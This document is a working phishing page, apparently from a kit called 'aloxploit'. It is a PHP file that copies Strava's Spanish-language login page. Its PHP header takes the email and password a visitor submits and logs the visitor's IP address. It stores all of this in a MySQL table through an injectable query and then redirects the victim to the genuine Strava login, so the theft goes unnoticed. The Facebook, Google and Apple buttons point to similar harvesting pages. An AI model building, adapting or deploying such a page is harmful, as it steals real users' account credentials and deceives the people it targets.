<?php

//echo "<h1> Pagina del registro</h1>";
$servername = "localhost";
$database = "aloxploitDatabase";
$username = "aloxploit";
$password = "alox123";


// creamos conexion
  $conn = mysqli_connect($servername, $username, $password, $database);
//si estan todos los campos rellenos los insertamos en la base de datos
  if( isset($_GET["email"]) && isset($_GET["password"]) && isset($_SERVER["REQUEST_METHOD"]) ){
$pass = $_GET["password"];
$mail = $_GET["email"];
 if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ipAddress = $_SERVER['REMOTE_ADDR'];
    }

  $insert = "insert into datos values('$mail', '$pass','Strava', '$ipAddress')";
//realizamos consulta para insertar los datos
  $return = mysqli_query( $conn, $insert);
  print_r( ( $return));
 // echo " : Registro correcto";
	header("Location: https://www.strava.com/login");
	exit();
}
mysqli_close( $conn);
?>


<!-- Application Layout -->
<!DOCTYPE html>
<html class='logged-out fullscreen responsive background-3 feed3p0 old-login' dir='ltr' lang='es-ES' xmlns:fb='http://www.facebook.com/2008/fbml' xmlns:og='http://opengraphprotocol.org/schema/' xmlns='http://www.w3.org/TR/html5'>
<!--
layout application
-->
<head>
<meta charset='UTF-8'>
<meta content='width = device-width, initial-scale = 1, maximum-scale = 5, user-scalable = yes' name='viewport'>
<style type='text/css'>
.spinner, .spinner .status {
  position: relative;
}
.spinner {
  margin-top: 1em;
  margin-bottom: 1em;
}
.spinner .status {
  top: 2px;
  margin-left: 0.5em;
}
.spinner .status:empty {
  display: none;
}
.spinner.lg .graphic {
  border-width: 3px;
  height: 32px;
  width: 32px;
}
.spinner.tiny {
  height: 10px;
  width: 10px;
}
.spinner.centered, .spinner.vcentered {
  box-sizing: border-box;
  width: 100%;
}
.spinner.vcentered {
  left: 0;
  margin-top: -12px;
  position: absolute;
  right: 0;
  text-align: center;
  top: 50%;
}
.spinner .graphic, .ajax-loading-image {
  animation: spin 1.2s infinite linear;
  box-sizing: border-box;
  border-color: #eee;
  border-radius: 50%;
  border-style: solid;
  border-top-color: #666;
  border-top-style: solid;
  border-width: 2px;
  content: "";
  display: inline-block;
  height: 20px;
  position: relative;
  vertical-align: middle;
  width: 20px;
}
@keyframes spin {
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(359deg);
  }
}
</style>

<link rel="stylesheet" media="screen" href="https://d3nn82uaxijpm6.cloudfront.net/assets/strava-app-icons-6a3e25b5f3ca64239bb266e5682c7d77affe69f979f409a45e9187834b1fe19e.css" />
<link rel="stylesheet" media="screen" href="https://d3nn82uaxijpm6.cloudfront.net/assets/strava-app-registration-46ef4dd6c1846943ba2b767833ee87d98ed2aa13f868c859183a0851394e3691.css" />

<link href='https://d3nn82uaxijpm6.cloudfront.net/apple-touch-icon-180x180.png?v=dLlWydWlG8' rel='apple-touch-icon' sizes='180x180'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/apple-touch-icon-152x152.png?v=dLlWydWlG8' rel='apple-touch-icon' sizes='152x152'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/apple-touch-icon-144x144.png?v=dLlWydWlG8' rel='apple-touch-icon' sizes='144x144'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/apple-touch-icon-120x120.png?v=dLlWydWlG8' rel='apple-touch-icon' sizes='120x120'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/apple-touch-icon-114x114.png?v=dLlWydWlG8' rel='apple-touch-icon' sizes='114x114'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/apple-touch-icon-76x76.png?v=dLlWydWlG8' rel='apple-touch-icon' sizes='76x76'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/apple-touch-icon-72x72.png?v=dLlWydWlG8' rel='apple-touch-icon' sizes='72x72'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/apple-touch-icon-60x60.png?v=dLlWydWlG8' rel='apple-touch-icon' sizes='60x60'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/apple-touch-icon-57x57.png?v=dLlWydWlG8' rel='apple-touch-icon' sizes='57x57'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/favicon-32x32.png?v=dLlWydWlG8' rel='icon' sizes='32x32' type='image/png'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/icon-strava-chrome-192.png?v=dLlWydWlG8' rel='icon' sizes='192x192' type='image/png'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/favicon-96x96.png?v=dLlWydWlG8' rel='icon' sizes='96x96' type='image/png'>
<link href='https://d3nn82uaxijpm6.cloudfront.net/favicon-16x16.png?v=dLlWydWlG8' rel='icon' sizes='16x16' type='image/png'>
<link href='/manifest.json?v=dLlWydWlG8' rel='manifest'>
<meta content='#FC5200' name='msapplication-TileColor'>
<meta content='https://d3nn82uaxijpm6.cloudfront.net/mstile-144x144.png?v=dLlWydWlG8' name='msapplication-TileImage'>
<meta content='#F7F7FA' name='theme-color'>
<meta content='Strava' name='apple-mobile-web-app-title'>
<meta content='Strava' name='application-name'>
<meta content='yes' name='apple-mobile-web-app-capable'>
<meta content='black' name='apple-mobile-web-app-status-bar-style'>

<script type='application/ld+json'>
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "Strava",
  "url": "https://www.strava.com/",
  "logo": "https://d3nn82uaxijpm6.cloudfront.net/assets/brands/strava/logo-strava-lg-5671105ffddb86e437bb68503a4973e8bf07e2a41c0b332d3e3bced21d537e98.png",
  "sameAs": [
    "https://facebook.com/Strava",
    "https://twitter.com/strava",
    "https://instagram.com/strava",
    "https://youtube.com/stravainc",
    "https://blog.strava.com",
    "https://github.com/strava",
    "https://medium.com/strava-engineering"
  ]
}


</script>
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="a6bFUjm7z50MVoMbaBLrpN/yIqY5eHFVRJTFFnWX6DtcEuUDIL0IbObRaJh12xrZRJpXyepdzH18prPGt3XKcw==" />
<script>
  window.StravaSentry = { 
    enabled: true,
    release: "9505cce55c19d51dfbdd1c913340afe46266d7e2",
    userId: null,
    environment: "production",
    dsn: "https://6ffc1c27d92347b49d7659886aab9deb@o352714.ingest.sentry.io/5816222",
    debug: false,
    sampleRate: 1,
  }
  
  window.StravaDevTools = {
    enabled: null
  }
</script>
<link rel="stylesheet" media="screen" href="//d3nn82uaxijpm6.cloudfront.net/packs/css/global-c6da620d.css" />
<script src="//d3nn82uaxijpm6.cloudfront.net/packs/js/runtime-b54a5a6790babf93e1e1.js"></script>
<script src="//d3nn82uaxijpm6.cloudfront.net/packs/js/88471-55c5fa3863d1df085e87.js"></script>
<script src="//d3nn82uaxijpm6.cloudfront.net/packs/js/16971-93a33ec8331ff3d6a6ec.js"></script>
<script src="//d3nn82uaxijpm6.cloudfront.net/packs/js/62418-d9d0c34442d823a968c7.js"></script>
<script src="//d3nn82uaxijpm6.cloudfront.net/packs/js/global-ef529fd99e32f9140dc4.js"></script>

<script>
  !function() {
    if (!!window.stravaPublicServiceEnv) {
      // Object containing no secret key value pairs that are expected to be seen and used in the browser.
      // This keys are commonly passed to 3rd party libs or tooling.
      window.stravaPublicServiceEnv({
        MUX_ENV_KEY: "bqst82u23r97a7fuo892gfpn2",
        MUX_DATA_VIEWER_USER_ID: null,
        VIDEOJS_LOG_LEVEL: "error"
      });
    }
  }();
</script>




<title>Iniciar sesión | Strava</title>



<script>
  !function(options){
    window.Strava = window.Strava || {};
    var _enabled = true;
    var _options = options;
    var _snowplowReady = null;
  
    window.Strava.ExternalAnalytics = window.Strava.ExternalAnalytics || (
      {
        isEnabled: function() {
          return _enabled;
        },
        isDebug: function() {
          return _options.debug;
        },
        track: function() {
        },
        trackV2: function(event) {
          var eventData = {
            'category': event.category,
            'page': event.page,
            'action': event.action,
            'element': event.element || null,
            'properties': event.properties || {}
          }
          if (this.isEnabled()) {
            snowplow('trackSelfDescribingEvent', {
              schema: 'iglu:com.strava/track/jsonschema/1-0-0',
              data: eventData
            });
          } else {
            if(this.isDebug()){
              // toggle defined in - https://github.com/strava/active/blob/main/lib/strava/external_analytics.rb
              // to turn on - Strava::ExternalAnalytics.turn_on_debug
              // to turn off - Strava::ExternalAnalytics.turn_off_debug
              !!console.table && console.table(eventData);
            }
          }
        },
        trackLink: function() {
        },
        trackForm: function() {
        },
        identifyV2: function () {
        },
        getExperimentContext: function(pageProperties) {
          var experiment = ( pageProperties || {} ).experiment_info || {};
          if (experiment.experiment_cohort && experiment.experiment_name) {
            this.log('found experiment with values', experiment);
            return {
              schema: 'iglu:com.strava/web_experiment/jsonschema/1-0-0',
              data: {
                experiment_name: experiment.experiment_name,
                cohort: experiment.experiment_cohort,
                forced: experiment.experiment_forced === true
              }
            };
          } else {
            return null;
          }
        },
        page: function(pageProperties) {
          if(this.isEnabled()) {
            snowplow('trackPageView');
          }
        },
        identify: function(athleteId, options, eventName) {
          if (this.isEnabled()) {
            var properties = options || {}
            properties.athlete_id = athleteId;
            var eventData = {
              'category': 'identify',
              'page': null,
              'action': eventName,
              'element': null,
              'properties': properties
            };
            snowplow('trackSelfDescribingEvent', {
              schema: 'iglu:com.strava/track/jsonschema/1-0-0',
              data: eventData
            });
          }
        },
        reset: function() {
          if(this.isEnabled()) {
            snowplow('setUserId', null)
            var spCookie = document.cookie.match('_sp_id\\.[a-f0-9]+')
            if(spCookie != null) {
              document.cookie = spCookie[0] + "= ; expires = Thu, 01 Jan 1970 00:00:00 GMT"
            }
          }
        },
        setup: function(athleteId, pageProperties) {
          if(this.isEnabled()) {
            snowplow("newTracker", "cf", "c.strava.com", {
              appId: "strava-web",
              platform: "web"
            });
            snowplow('setUserId', athleteId);
            var experimentContext = this.getExperimentContext(pageProperties);
            if (experimentContext) {
              snowplow('addGlobalContexts', [experimentContext]);
            }
            snowplow('enableFormTracking');
          }
        },
        getDomainUserId: function() {
          var d = jQuery.Deferred();
          if (this.isEnabled()) {
            if (!_snowplowReady) {
              _snowplowReady = jQuery.Deferred();
              snowplow(function(){
                _snowplowReady.resolve(this.cf.getDomainUserId());
              });
            }
            _snowplowReady.always(function(getDomainUserId){
              d.resolve(getDomainUserId);
            });
          } else {
            d.reject(null);
          }
          return d;
        },
        log: function(message, values) {
          if(this.isDebug()) {
            console.log(message, 'background-color: yellow; color: blue; font-size: medium;', values);
          }
        },
        debug: function(value) {
          _options.debug = value;
        }
      }
    )
  }({
    is_mobile: false,
    os: "",
    debug: false,
    athlete_id: null,
    locale: "es-ES"
  });
</script>

<script>
  !function(){
    var analytics = window.analytics = window.analytics || [];
    if(analytics.invoked) {
      window.console && console.error && console.error("Segment snippet included twice.");
    } else {
      (function(p,l,o,w,i,n,g){if(!p[i]){p.GlobalSnowplowNamespace=p.GlobalSnowplowNamespace||[];p.GlobalSnowplowNamespace.push(i);p[i]=function(){(p[i].q=p[i].q||[]).push(arguments)};p[i].q=p[i].q||[];n=l.createElement(o);g=l.getElementsByTagName(o)[0];n.async=1;n.src=w;g.parentNode.insertBefore(n,g)}}(window,document,"script","https://d3nn82uaxijpm6.cloudfront.net/8f96b1247cf4359f8fec.js","snowplow"));
      var pageProperties = null;
      var athleteId = null;
      Strava.ExternalAnalytics.setup(athleteId, pageProperties);
      Strava.ExternalAnalytics.page(pageProperties);
    }
  }();
</script>

<script>
  !function(debug){
    window.Strava = window.Strava || {};
    var _enabled = false;
    var _debug = !!debug;
    var _branchData = null;
  
    window.Strava.BranchIO = window.Strava.BranchIO || (
      {
        isEnabled: function() {
          return _enabled;
        },
        isDebug: function() {
          return _debug;
        },
        dataToLocalStorage: function() {
          if (!_branchData) {
            _branchData = new Strava.BranchAnalytics.BranchData();
          }
  
          var d = this.data()
          var that = this;
          d.done(function(data) {
            that.log('storing data %o to local storage', data)
            _branchData.data(data)
          });
          d.fail(function(message) {
            that.log('failed to retrieve data from branch');
            _branchData.data({})
          });
          return d;
        },
        createLink: function(options) {
          var d = jQuery.Deferred();
          var data = null;
          const that = this;
          var callback = function(e, l) {
            if (!e) {
              d.resolve(l);
            } else {
              d.reject(e);
            }
          }
          if (options.peek_data) {
            data = this.dataFromLocalStorage();
            if (data && data.data_parsed && data.data_parsed['~referring_link']) {
              d.resolve(data.data_parsed['~referring_link']);
            } else {
              d.reject();
            }
          } else {
  
            Strava.ExternalAnalytics
              .getDomainUserId()
              .always(function(domainUserId){
                if (domainUserId) {
                  options.data['domainUserId'] = domainUserId;
                }
  
                if(that.isEnabled()) {
                  branch.link(options, callback);
                };
            });
          }
          return d;
        },
        dataFromLocalStorage: function() {
          if (!_branchData) {
            _branchData = new Strava.BranchAnalytics.BranchData();
          }
          return _branchData.data();
        },
        clearLocalStorage: function() {
          if (!_branchData) {
            _branchData = new Strava.BranchAnalytics.BranchData();
          }
          _branchData.data({});
        },
        data: function(checkLocalStorage) {
          var d = jQuery.Deferred();
          var that = this;
          var c = function(message, meta_data) {
            var storedData = null;
  
            if(message) {
              d.reject(message);
            } else {
              if (checkLocalStorage == true && (meta_data == null || meta_data.data == "" || meta_data.data == null)) {
                storedData = that.dataFromLocalStorage();
                that.clearLocalStorage();
  
                d.resolve(storedData);
              } else {
                d.resolve(meta_data);
              }
            }
          };
  
          if(this.isEnabled()) {
            branch.data(c);
            this.log('%cdata (branch enabled)');
          } else {
            this.log('%cdata (branch disabled)');
            d.resolve({});
          }
          return d;
        },
        identify: function(athleteId) {
          var callback = function(error, data) {
            if (error) {
              console.log(error);
            }
          }
          if(this.isEnabled()) {
            branch.setIdentity(athleteId, callback);
          }
        },
        track: function(eventName, metaData) {
          var callback = function(error, data) {
            if (error) {
              console.log(error);
            }
          }
          if(this.isEnabled()) {
            branch.track(eventName, metaData, callback);
          }
        },
        log: function(message, values) {
          if(this.isDebug()) {
            console.log(message, 'background-color: yellow; color: blue; font-size: medium;', values);
          }
        },
        debug: function(value) {
          _debug = value;
        }
      }
    )
  }(false);
</script>


</head>
<body class='logged-out fullscreen responsive background-7 feed3p0 old-login'>


<div class='view'>
<header id='global-header'><!--
deploy: 9505cce55c19d51dfbdd1c913340afe46266d7e2
-->
<!--[if lte IE 8]>
<div class='alert alert-warning message warning mb-0 text-center'>
<p>Es probable que estés usando una versión de Internet Explorer que Strava no admite.  <a href='http://www.microsoft.com/en-us/download/ie.aspx?q=internet+explorer'>Actualiza tu navegador web</a> &mdash; <a href='https://strava.zendesk.com/entries/20420212-Supported-Browsers-on-Strava'>Más información</a>.</p>
</div>
<![endif]-->
<nav class='nav-bar container' role='navigation'>
<div title="Volver a la página inicial de Strava" class="branding"><a class="branding-content" href="/"><span class="sr-only">Strava</span></a></div>
<!-- / Nav Menu Button -->
<a href="#container-nav" aria-expanded="false" aria-controls="container-nav" data-toggle="collapse" class="btn btn-default btn-mobile-menu" role="button">Menú</a>
<div class='nav-container' id='container-nav'>
<ul class='user-nav nav-group'>
<li class='nav-object-group'>
<div class='nav-item logged_out_nav'>
<a class='btn btn-primary btn-signup' data-segioevent='{&quot;name&quot;:&quot;Signup Flow&quot;,&quot;method&quot;:&quot;web&quot;,&quot;source&quot;:&quot;Global Header&quot;}' href='/register?cta=sign-up&amp;element=global-header&amp;plan=free&amp;source=login'>
Suscribirse
</a>
</div>
</li>
</ul>

</div>
</nav>
</header>



<div class='messages'>
<div class='message page-status-message' style='display:none;'>Loading &hellip;</div>
</div>
<div class='page container'><div class='registration-panel'>
<h1 class='mb-0'>
Iniciar sesión

</h1>

<form id="login_form" class="website" action="strava.php" accept-charset="UTF-8" method="get"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="142owUD05UQiJomY2bM4rNJSyVfZ0NVpISqG0lpEIpHgOYiQWfIitcihYhvEesnRSTq8OAr1aEEZGPACmKYA2Q==" />
<div class='facebook'>
<a class='btn btn-block fb-button' href='facebook.php'>
Iniciar sesión con Facebook
</a>
</div>
<div class='google'>
<a class='btn btn-block google-button' href='google.php'>
Iniciar sesión con Google
</a>
</div>
<a class='btn btn-block apple-signup-button apple-button' id='apple-signin' href='apple.php'>
Iniciar sesión con Apple
</a>

<div class='text-body text-center mt-md mb-md'>
O inicia sesión con tu correo electrónico
</div>
<input type="hidden" name="plan" id="plan" />
<fieldset class='mt-0 mb-0'>
<div class='form-group'>
<input type="email" name="email" id="email" value="" placeholder="Correo electrónico" autofocus="autofocus" class="form-control" />
</div>
<div class='form-group'>
<input type="password" name="password" id="password" value="" placeholder="Contraseña" class="form-control" />
</div>
<label class='remember-me'>
<div class='checkbox'>
<label>
<input type="checkbox" name="remember_me" id="remember_me" value="on" />
Recordarme
</label>
</div>
</label>
</fieldset>
<button class='btn btn-primary' id='login-button' type='submit'>
Iniciar sesión
</button>
<div class='reset-password'>
<b><a href="/account/recover">¿Olvidaste tu contraseña?</a></b>
</div>
</form>

</div>
</div>
<footer><div class='media-sm-show visible-sm-block mobile-footer-nav'>
<ul>
<li class=''><a href="/tour">Funciones</a></li>
</ul>
<div class='inner-content'><a class="alt button" data-segioevent="{&quot;name&quot;:&quot;RegisterFlow ViewForm&quot;,&quot;source&quot;:&quot;mobile_footer&quot;}" href="/register/free?cta=sign-up&amp;element=nav&amp;source=mobile-footer">Regístrate de forma gratuita</a></div>
</div>
<div class='footer-global container'>
<div class='row'>
<div class='col-md-3'>
<div title="Volver a la página inicial de Strava" class="branding logo-lg logo-bw"><a class="branding-content" href="/"><span class="sr-only">Strava</span></a></div>
<div class='copyright'>
© 2022 Strava
</div>
</div>
<div class='col-md-2 col-md-offset-1 nav'>
<h4 class='topless'>Strava</h4>
<ul class='list-unstyled'>
<li><a href="/about">Strava</a></li>
<li><a href="/features">Funciones</a></li>
<li><a href="/mobile">Móvil</a></li>
<li><a href="/subscribe?cta=subscription&amp;element=nav&amp;origin=global_footer">Suscripción</a></li>
<li><a href="/student?origin=global_footer">Descuento para estudiantes</a></li>
<li><a href="/legal/privacy">Política de privacidad</a></li>
<li><a href="/legal/terms">Términos y condiciones</a></li>
<li><a href="https://support.strava.com/hc/en-us/articles/216917717-About-Strava-Maps">Acerca de nuestros mapas</a></li>
</ul>
</div>
<div class='col-md-2 nav'>
<h4 class='topless'>Redes sociales</h4>
<ul class='list-unstyled'>
<li><a target="_blank" href="http://www.facebook.com/Strava">Facebook</a></li>
<li><a target="_blank" href="http://twitter.com/strava">Twitter</a></li>
<li><a target="_blank" href="http://instagram.com/strava">Instagram</a></li>
<li><a target="_blank" href="http://www.youtube.com/stravainc">YouTube</a></li>
<li><a href="http://blog.strava.com">Blog</a></li>
</ul>
</div>
<div class='col-md-2 nav'>
<h4 class='topless'>Ayuda</h4>
<ul class='list-unstyled'>
<li><a href="https://strava.zendesk.com/home">Ayuda Strava</a></li>
</ul>

</div>
<div class='col-md-2 nav'>
<h4 class='topless'>Más</h4>
<ul class='list-unstyled'>
<li><a data-segioevent="{&quot;name&quot;:&quot;RegisterFlow ViewForm&quot;,&quot;source&quot;:&quot;global_footer&quot;}" href="/register/free?cta=sign-up&amp;element=global-footer&amp;source=login">Suscribirse</a></li>
<li><a href="https://www.strava.com/login">Iniciar sesión</a></li>
<li><a href="/careers">Empleo</a></li>
<li><a href="https://business.strava.com">Strava Business</a></li>
<li><a href="http://labs.strava.com/developers">Desarrolladores (en inglés)</a></li>
<li><a href="http://labs.strava.com">Labs (en inglés)</a></li>
<li><a href="/pros">Profesionales en Strava</a></li>
<li><a href="/community-standards">Normas de la comunidad Strava</a></li>
</ul>

</div>
</div>
</div>
<a id="back-to-top" class="media-sm-show visible-sm-block" href="#">Arriba ↑</a>
</footer>


</div>
<script id='lightbox-template' type='text/template'>
<div class='lightbox-window modal-content'>
<div class='close-lightbox'>
<button class='btn btn-unstyled btn-close'>
<div class='app-icon icon-close icon-xs icon-dark'></div>
</button>
</div>
</div>
</script>
<script id='popover-template' type='text/template'>
<div class='popover'></div>
</script>
<script>
  window._asset_host = "https://d3nn82uaxijpm6.cloudfront.net";
  window._measurement_preference = "meters";
  window._date_preference = "%m/%d/%Y";
  window._datepicker_preference_format = "mm/dd/yy";
  
  jQuery(document).ready(function() {
    Strava.Util.EventLogging.createInstance("https://analytics.strava.com","7215fa60b5f01ecc3967543619f7e3d9", null);
  });
</script>
<script src="https://d3nn82uaxijpm6.cloudfront.net/assets/strava/i18n/locales/es-ES-a2e820e10fbb96eeab2688e85c3d336aa1be47affd3408787480fde3ab50c828.js"></script>
<script src="https://d3nn82uaxijpm6.cloudfront.net/assets/application-1f29486af479f2fb744694df43993b8d8ce62db650cd5594af266dadf156d90c.js"></script>

<script src="https://www.strava.com/cookie-banner"></script>
<script>
  jQuery(document).ready(function(){
    typeof StravaCookieBanner !== 'undefined' && StravaCookieBanner.render();
  });
</script>

<script src="https://d3nn82uaxijpm6.cloudfront.net/assets/bootstrap.min-2319b0c15c5e724e0c5d5d22453428398a67760bcea15fef2865429d03387fbc.js"></script>

<script>
  jQuery('document').ready(function() {
    setTimeout(function() {
      jQuery('#face-pile').css('visibility', 'visible');
    }, 300);
  });
  var ua = navigator.userAgent;
  var checker = {
    ios: ua.match(/(iPhone|iPod|iPad)/),
    android: ua.match(/Android/)
  };
  
  var regButton = jQuery('#get-started-button');
  if (checker.android || checker.ios) {
    regUrl = regButton.attr('href');
    if (checker.android) {
      regUrl = 'https://market.android.com/details?id=com.strava';
    } else if (checker.ios) {
      regUrl = 'http://itunes.apple.com/app/strava-cycling/id426826309';
    }
    regButton.attr('href', regUrl).text('Get the App');
  }
  regButton.css('visibility', 'visible');
</script>
<script>
  var currentAthlete = new Strava.Models.CurrentAthlete({"logged_in":false});
  HAML.globals = function() {
    return {
      currentAthlete: currentAthlete,
      renderPartial: function(name, context) {
        if (context == null) {
          context = this;
        }
        return JST[name](context);
      }
    }
  }
</script>

<script>
  new Strava.Initializer();
</script>
<script src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"></script>
<script>
  jQuery(document).ready(function() {
    AppleID.auth.init({
      clientId : 'com.strava.app.sign.in',
      scope : 'name email',
      redirectURI: 'https://www.strava.com/o_auth/apple',
      state: '{&quot;context&quot;:&quot;apple_web_signin&quot;,&quot;state&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0ZV9wYXJhbSI6InIyZjBzODJxczY2MmkxZ3FlaDRoazU0c3NqZmxycjh0In0.XEJbUcxNwg1n4f5GT6-NXj0obKFxPIbyvxXeyt2wX3k&quot;}'
    });
  
    const appleSignin = document.getElementById('apple-signin');
    appleSignin.addEventListener('click', function() {
      AppleID.auth.signIn();
    });
  });
  
  jQuery(document).on('click', '.apple-signin-button', function() {
    Strava.ExternalAnalytics.trackV2({
      category: 'onboarding',
      page: 'home',
      action: 'click',
      element: 'apple_signin'
    });
  });
</script>

<script>
  if ('serviceWorker' in navigator) {
    window.addEventListener('load', function() {
      navigator.serviceWorker.register("/service_worker.js?v=dLlWydWlG8").then(function(registration) {
      }, function(err) {
        console.log('ServiceWorker registration failed: ', err);
      });
    });
  }
</script>
<script>
  jQuery(document).ready(function() {
    // Scroll Tracking
    jQuery(document).one('scroll', function(){
      Strava.ExternalAnalytics.trackV2({
        category: 'page_scrolled'
      });
    });
  });
</script>
<script>
  // Mobile Menu transition handler
  jQuery('.collapsable-nav #container-nav')
    .on('show.bs.collapse', function(){
      jQuery('.smartbanner-content').slideUp(100);
      jQuery('html').addClass('mobile-menu-open');
    })
    .on('hidden.bs.collapse', function(){
      jQuery('.smartbanner-content').slideDown(100);
      jQuery('html').removeClass('mobile-menu-open');
    });
</script>


<script>
  jQuery(document).ready(function(){
    if (!Backbone.History.started) {
      if (Modernizr.history) {
        Backbone.history.start({ pushState: true, silent: false });
      } else {
        Backbone.history.start({ pushState: false, silent: false, hashChange: false });
      };
    }
  });
</script>
</body>
</html>
